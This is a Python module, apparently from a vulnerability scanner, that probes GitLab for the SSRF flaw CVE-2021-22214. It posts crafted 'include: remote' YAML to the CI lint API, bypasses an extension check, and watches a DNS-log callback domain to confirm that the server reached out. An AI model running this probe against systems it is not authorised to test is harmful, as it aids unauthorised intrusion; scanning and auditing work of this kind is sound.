#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2021_22214_payloads = [
    {
        'path': 'api/v4/ci/lint',
        'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSDOMAIN/api/v1/targets/?test.yml"}'
    },
    {
        'path': 'v4/ci/lint',
        'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSDOMAIN/api/v1/targets/?test.yml"}'
    },
    {
        'path': 'ci/lint',
        'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSDOMAIN/api/v1/targets/?test.yml"}'
    },
]

def cve_2021_22214_scan(self, clients):
    ''' Gitlab的CI lint API用于验证提供给gitlab ci的配置文件是否是yaml格式, 
        其include操作支持remote选项, 用于获取远端的yaml, 因此在此处将remote参数设置为本地回环地址, 
        同时由于后端会检查最后扩展名, 加上?test.yaml 即可绕过
    '''
    client = clients.get('reqClient')
    sessid = '35c4b2b338754840369c3b20a2847f0a'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SSRF',
        'vul_id': 'CVE-2021-22214',
    }

    headers = {
        'Content-Type': 'application/json'
    }

    for payload in cve_2021_22214_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
